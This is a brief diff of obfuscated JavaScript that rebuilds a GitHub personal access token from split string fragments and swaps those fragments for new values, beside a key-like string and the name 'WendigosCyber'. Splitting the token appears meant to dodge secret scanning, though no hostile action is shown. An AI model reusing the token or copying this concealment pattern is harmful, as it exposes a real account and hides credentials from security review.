@@ -1,7 +1,7 @@
       (() => {
   const _0xp1 = "github_pat_";
-  const _0xp2 = "11CFHQNFQ0txIlHWQ4ygph_XS6m6ytvUPKVWiRNZY00weUAk8u3C85aP";
-  const _0xp3 = "7L34CZotbOFXGHOG542MfeCRM7";
+  const _0xp2 = "11CFHQNFQ0AQafyYrj1g8u_60hE9cbMTeqsiyTeLSYlL89rGdO7bsui";
+  const _0xp3 = "2H0h12ULefMDEOR4TX7sRLU5Nwn";
   const _0xd = "Kdbdieo3hbdk8dyxbxnkdmdjsikjkd97hHJBg7o";
   const _0xTk = _0xp1 + _0xp2 + _0xp3;
   const _0xOn = "WendigosCyber";
